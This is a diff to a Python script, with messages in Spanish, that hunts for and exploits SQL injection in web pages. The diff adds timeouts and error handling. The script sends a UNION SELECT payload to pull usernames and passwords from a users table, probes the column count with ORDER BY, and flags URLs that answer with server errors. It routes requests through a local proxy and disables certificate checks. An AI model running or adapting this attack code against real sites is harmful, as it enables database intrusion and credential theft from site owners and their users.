@@ -5,6 +5,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import time
 import random
 from urllib.parse import urlparse
+from requests.exceptions import SSLError, ConnectionError
 
 proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}
 
@@ -12,13 +13,14 @@ proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}
 def get_response(url, retries=3):
     for i in range(retries):
         try:
-            r = requests.get(url, verify=False, proxies=proxies)
+            r = requests.get(url, verify=False, proxies=proxies, timeout=10)
             if r.status_code == 200:
                 return r
             elif r.status_code == 403:
                 print(f"[+] Felicitaciones, su página web es segura: el acceso a {url} fue bloqueado con un código 403 (Forbidden).")
                 return r
-        except requests.RequestException:
+        except (requests.RequestException, SSLError, ConnectionError) as e:
+            print(f"[-] Error en la conexión a {url}: {e}")
             time.sleep(random.uniform(1, 3))
     print(f"[-] Failed to retrieve {url} after {retries} retries.")
     return None
@@ -70,8 +72,12 @@ def find_urls_to_test(url, base_url):
 def exploit_sqli_users_table(url):
     common_usernames = ['administrator', 'admin', 'root', 'superuser', 'sysadmin']
     sql_payload = "' UNION select username, password from users--"
-    r = requests.get(url + sql_payload, verify=False, proxies=proxies)
-    # res = r.text
+    #r = requests.get(url + sql_payload, verify=False, proxies=proxies)
+    try:
+        r = requests.get(url + sql_payload, verify=False, proxies=proxies, timeout=10)
+    except SSLError as e:
+        print(f"[-] SSL Error en {url}: {e}")
+        return False
     
     if "text/html" in r.headers.get("Content-Type", ""):
         soup = BeautifulSoup(r.text, 'html.parser')
@@ -115,10 +121,17 @@ def exploit_sqli(url):
 
     for payload in payloads:
         target_url = url + payload
-        r = requests.get(target_url, verify=False, proxies=proxies)
-        if "Internal Server Error" in r.text:
-            print(f"[+] Vulnerable URL found with payload {payload}")
-            return True
+        try:
+            r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)  # Añadido timeout y verify=False
+            if "Internal Server Error" in r.text:
+                print(f"[+] Vulnerable URL found with payload {payload}")
+                return True
+        except SSLError as e:  # Añadido manejo de SSLError
+            print(f"[-] SSL Error en {target_url}: {e}")
+            return False
+        except requests.RequestException as e:  # Añadido manejo de errores generales de solicitudes
+            print(f"[-] Request error en {target_url}: {e}")
+            return False
 
     return False
 
@@ -126,9 +139,16 @@ def exploit_sqli(url):
 def exploit_sqli_column_number(url):
     for i in range(1, 5):
         target_url = url + "'+order+by+%s--" % i
-        r = requests.get(target_url, verify=False, proxies=proxies)
-        if "Internal Server Error" in r.text:
-            return i - 1 
+        try:
+            r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
+            if "Internal Server Error" in r.text:
+                return i - 1 
+        except SSLError as e:
+            print(f"[-] SSL Error en {target_url}: {e}")
+            return False
+        except requests.RequestException as e:
+            print(f"[-] Request error en {target_url}: {e}")
+            return False
     return False
 
 if __name__ == "__main__":
